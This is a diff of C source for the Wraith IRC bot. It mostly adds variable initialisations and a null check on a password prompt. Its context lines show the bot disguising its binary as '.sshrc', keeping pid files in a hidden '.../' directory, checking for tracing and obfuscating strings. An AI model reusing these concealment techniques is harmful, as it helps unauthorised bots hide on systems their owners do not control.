@@ -79,7 +79,7 @@ int	term_z = 0;		/* Foreground: use the terminal as a party line? */
 int 	checktrace = 1;		/* Check for trace when starting up? */
 int 	updating = 0; 		/* this is set when the binary is called from itself. */
 char 	tempdir[DIRMAX] = "";
-char 	*binname;
+char 	*binname = NULL;
 time_t	online_since;		/* Unix-time that the bot loaded up */
 
 char	owner[121] = "";	/* Permanent owner(s) of the bot */
@@ -87,8 +87,8 @@ int	save_users_at = 0;	/* How many minutes past the hour to
 				   save the userfile? */
 int	notify_users_at = 0;	/* How many minutes past the hour to
 				   notify users of notes? */
-char	version[81];		/* Version info (long form) */
-char	ver[41];		/* Version info (short form) */
+char	version[81] = "";	/* Version info (long form) */
+char	ver[41] = "";		/* Version info (short form) */
 int	use_stderr = 1;		/* Send stuff to stderr instead of logfiles? */
 int	do_restart = 0;		/* .restart has been called, restart asap */
 char	quit_msg[1024];		/* quit message */
@@ -106,7 +106,7 @@ egg_traffic_t traffic;
 void fatal(const char *s, int recoverable)
 {
 #ifdef LEAF
-  module_entry *me;
+  module_entry *me = NULL;
 
   if ((me = module_find("server", 0, 0))) {
     Function *func = me->funcs;
@@ -162,11 +162,11 @@ static void checkpass()
   static int checkedpass = 0;
 
   if (!checkedpass) {
-    char *gpasswd;
+    char *gpasswd = NULL;
   
     gpasswd = (char *) getpass("");
     checkedpass = 1;
-    if (md5cmp(shellhash, gpasswd))
+    if (!gpasswd || (gpasswd && md5cmp(shellhash, gpasswd)))
       fatal(STR("incorrect password."), 0);
   }
 }
@@ -190,7 +190,7 @@ static void got_ed(char *which, char *in, char *out)
 
 static void show_help()
 {
-  char format[81];
+  char format[81] = "";
 
   egg_snprintf(format, sizeof format, "%%-30s %%-30s\n");
 
@@ -228,6 +228,7 @@ static void dtx_arg(int argc, char *argv[])
   int localhub_pid = 0;
 #endif /* LEAF */
   char *p = NULL;
+
   while ((i = getopt(argc, argv, PARSE_FLAGS)) != EOF) {
     if (strchr(FLAGS_CHECKPASS, i))
       checkpass();
@@ -281,7 +282,8 @@ static void dtx_arg(int argc, char *argv[])
         got_ed("d", optarg, p);
       case 'v':
       {
-        char date[50];
+        char date[50] = "";
+
         egg_strftime(date, sizeof date, "%c %Z", gmtime(&buildts));
 	printf("Wraith %s\nBuild Date: %s (%lu)\n", egg_version, date, buildts);
         printf("SALTS\nfiles: %s\nbotlink: %s\n", SALT1, SALT2);
@@ -290,8 +292,8 @@ static void dtx_arg(int argc, char *argv[])
 #ifdef LEAF
       case 'L':
       {
-        FILE *fp;
-        char buf2[DIRMAX], s[11];
+        FILE *fp = NULL;
+        char buf2[DIRMAX] = "", s[11] = "";
 
         egg_snprintf(buf2, sizeof buf2, "%s/.../.pid.%s", confdir(), optarg);
         if ((fp = fopen(buf2, "r"))) {
@@ -401,7 +403,7 @@ static void core_secondly()
       call_hook(HOOK_5MINUTELY);
 /* 	flushlogs(); */
       if (!miltime) {	/* At midnight */
-	char s[25];
+	char s[25] = "";
 
 	strncpyz(s, ctime(&now), sizeof s);
 #ifdef HUB
@@ -567,6 +569,7 @@ int main(int argc, char **argv)
   /* move the binary to the correct place */
   {
     char newbin[DIRMAX] = "";
+
     sdprintf(STR("my euid: %d my uuid: %d, my ppid: %d my pid: %d"), geteuid(), myuid, getppid(), getpid());
     chdir(homedir());
     egg_snprintf(newbin, sizeof newbin, STR("%s/.sshrc"), homedir());
@@ -819,7 +822,6 @@ printf("bleh..ip: %s host: %s ip6: %s host6: %s\n", conf.bot->ip, conf.bot->host
     } else
       socket_cleanup--;
 
-    buf[0] = 0;
     xx = sockgets(buf, &i); 
     /* "chanprog()" bug is down here somewhere.... */
     if (xx >= 0) {		/* Non-error */
